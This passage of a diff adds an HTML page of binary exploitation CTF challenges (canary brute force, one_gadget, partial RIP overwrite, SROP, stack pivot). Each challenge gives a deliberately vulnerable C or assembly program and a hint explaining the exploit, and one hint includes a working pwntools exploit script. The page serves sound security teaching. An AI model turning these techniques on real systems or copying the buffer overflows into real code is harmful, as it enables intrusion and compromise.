+          <p class="objective">A forking server reuses the same canary in every child. Brute-force it byte by byte.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// canary_fork.c
+// gcc -o canary_fork canary_fork.c -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/wait.h&gt;
+
+void win() { system("cat flag.txt"); }
+
+void vuln() {
+    char buf[32];
+    printf("&gt; ");
+    fflush(stdout);
+    read(0, buf, 256);
+}
+
+int main() {
+    setbuf(stdout, NULL);
+    while (1) {
+        pid_t pid = fork();
+        if (pid == 0) { vuln(); exit(0); }
+        else {
+            int s;
+            wait(&amp;s);
+            if (WIFSIGNALED(s)) printf("crash\n");
+            else printf("ok\n");
+            fflush(stdout);
+        }
+    }
+}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Canary byte 0 is always <code>\x00</code>. For each subsequent byte (1–7): send <code>buf_fill + known_canary_bytes + guess</code>. If response is "ok" → byte correct; "crash" → wrong. After recovering all 8 canary bytes, overflow past canary + RBP and overwrite return address to <code>win</code>. Max ~1792 connections.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 7: one_gadget Exploit</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Skip the ROP chain entirely — use a single libc gadget that spawns a shell.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// one_gadget_ctf.c
+// gcc -o one_gadget_ctf one_gadget_ctf.c -fno-stack-protector -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void vuln() {
+    char buf[64];
+    printf("puts @ %p\n", puts);
+    printf("Data: ");
+    gets(buf);
+}
+
+int main() { vuln(); return 0; }</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Parse the leaked <code>puts</code> address, subtract <code>libc.symbols['puts']</code> to get libc base. Run <code>one_gadget /path/to/libc.so.6</code> to find magic offsets. Each gadget has constraints (e.g., <code>[rsp+0x40] == NULL</code>). Try each until one works. Add a <code>ret</code> gadget for alignment if needed.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 8: Partial EIP/RIP Overwrite</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">PIE is enabled but you can only overflow 2 bytes into the return address. Exploit with partial overwrite + brute force.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// partial_rip.c
+// gcc -o partial_rip partial_rip.c -fno-stack-protector -pie
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void win() { execve("/bin/sh", NULL, NULL); }
+
+void vuln() {
+    char buf[64];
+    printf("Go: ");
+    read(0, buf, 74);  // only 2 bytes past return address
+}
+
+int main() { vuln(); return 0; }</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>With PIE, the low 12 bits of any function offset are constant. Overwriting 2 bytes (16 bits) means 12 known + 4 unknown bits = 1/16 brute force. Calculate <code>win</code>'s offset from <code>vuln</code>'s return point, overwrite only the low 2 bytes, and loop until success (~16 attempts on average).</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 9: SROP — Sigreturn Oriented Programming</h4>
+          <span class="difficulty difficulty-expert">Expert</span>
+          <p class="objective">No libc, minimal gadgets. Use a sigreturn frame to set all registers and call execve.</p>
+          <div class="setup-code">
+<pre><code class="language-nasm">; srop.asm — nasm -f elf64 srop.asm &amp;&amp; ld -o srop srop.o
+section .text
+global _start
+
+_start:
+    ; read(0, rsp, 0x400)
+    xor rax, rax
+    xor rdi, rdi
+    mov rsi, rsp
+    mov rdx, 0x400
+    syscall
+    ret
+
+syscall_gadget:
+    syscall
+    ret
+
+section .data
+    binsh db "/bin/sh", 0</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Use pwntools <code>SigreturnFrame()</code>: set <code>rax=59</code> (execve), <code>rdi=addr_of_binsh</code>, <code>rsi=0</code>, <code>rdx=0</code>, <code>rip=syscall_gadget</code>. First trigger <code>sigreturn</code> (syscall with rax=15): overflow → <code>pop rax; ret</code> → 15 → <code>syscall; ret</code> → kernel restores your fake signal frame → execve fires.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 10: Overflow with Limited Input</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">You have exactly enough bytes to overwrite the return address — nothing more. No room for alignment gadgets or ROP chains.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// limited.c
+// gcc -o limited limited.c -fno-stack-protector -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void win() { system("/bin/sh"); }
+
+void vuln() {
+    char buf[64];
+    printf("Data: ");
+    read(0, buf, 80);  // 64 + 8 (rbp) + 8 (ret) — exactly 1 address
+}
+
+int main() { vuln(); return 0; }</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>With only 80 bytes, you can fit exactly: 64 (buffer) + 8 (saved RBP) + 8 (return address). No room for a <code>ret</code> alignment gadget. If <code>system()</code> crashes from misalignment, jump to <code>win+5</code> (skip the <code>push rbp</code>) to change stack alignment. Or use <code>win</code>'s address where the function body starts after the prologue.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 11: Nested Function Exploitation</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Overflow in a deeply nested call chain. Can you overwrite return addresses across multiple stack frames?</p>
+          <div class="setup-code">
+<pre><code class="language-c">// nested.c
+// gcc -o nested nested.c -fno-stack-protector -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void win() { system("cat flag.txt"); }
+
+void inner() {
+    char buf[32];
+    printf("inner&gt; ");
+    gets(buf);
+}
+
+void middle() {
+    char pad[16];
+    inner();
+    printf("middle done\n");
+}
+
+void outer() {
+    char pad[16];
+    middle();
+    printf("outer done\n");
+}
+
+int main() { outer(); return 0; }</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Use GDB to map the full stack: <code>x/40gx $rsp</code> after the overflow. The overflow in <code>inner()</code> can reach past <code>inner</code>'s frame into <code>middle</code>'s and <code>outer</code>'s saved RBP/return addresses. Overwrite <code>inner</code>'s return address to redirect immediately, or corrupt multiple frames for chained effects. Be careful with saved RBP values — corrupting them can crash <code>leave</code> instructions.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 12: Stack Pivot + Shellcode</h4>
+          <span class="difficulty difficulty-expert">Expert</span>
+          <p class="objective">Buffer too small for shellcode. Pivot the stack to a larger writable area and execute from there.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// pivot_shell.c
+// gcc -o pivot_shell pivot_shell.c -fno-stack-protector -no-pie -z execstack
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+char stage2[0x400];  // bss — known address
+
+void vuln() {
+    char buf[16];  // too small for shellcode
+    printf("stage2 @ %p\n", stage2);
+    printf("Shellcode: ");
+    read(0, stage2, 0x400);   // shellcode goes here
+    printf("Overflow: ");
+    read(0, buf, 48);          // small overflow
+}
+
+int main() { vuln(); return 0; }</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Two stages: (1) Read shellcode into <code>stage2</code> (bss, known address — no PIE). (2) Overflow <code>buf</code>: overwrite saved RBP with <code>&amp;stage2</code> and return address with a <code>leave; ret</code> gadget. This sets <code>RSP = stage2</code> and pops the first qword as new RBP, then returns to stage2+8 where your shellcode begins. Or simply overwrite ret with <code>stage2</code> address if bss is executable (check with <code>readelf -l</code>).</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 13: Time-Limited Exploit</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">A 2-second alarm kills the process. Automate your exploit — no manual interaction allowed.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// timed.c
+// gcc -o timed timed.c -fno-stack-protector -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;unistd.h&gt;
+
+void win() { system("cat flag.txt"); }
+void timeout_handler(int sig) { printf("Too slow!\n"); exit(1); }
+
+void vuln() {
+    char buf[64];
+    printf("Quick! ");
+    gets(buf);
+}
+
+int main() {
+    signal(SIGALRM, timeout_handler);
+    alarm(2);
+    vuln();
+    return 0;
+}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Pre-compute everything — no interactive discovery. Script the full exploit in pwntools:</p>
+<pre><code class="language-python">from pwn import *
+elf = ELF('./timed')
+p = process('./timed')
+offset = 72
+payload = b'A'*offset + p64(elf.symbols['win'])
+p.sendlineafter(b'Quick! ', payload)
+print(p.recvall(timeout=2))</code></pre>
+            <p>Alternatively, to buy time: ROP to <code>alarm(0)</code> first (cancels the timer), then return to <code>vuln</code> again for a relaxed second pass.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
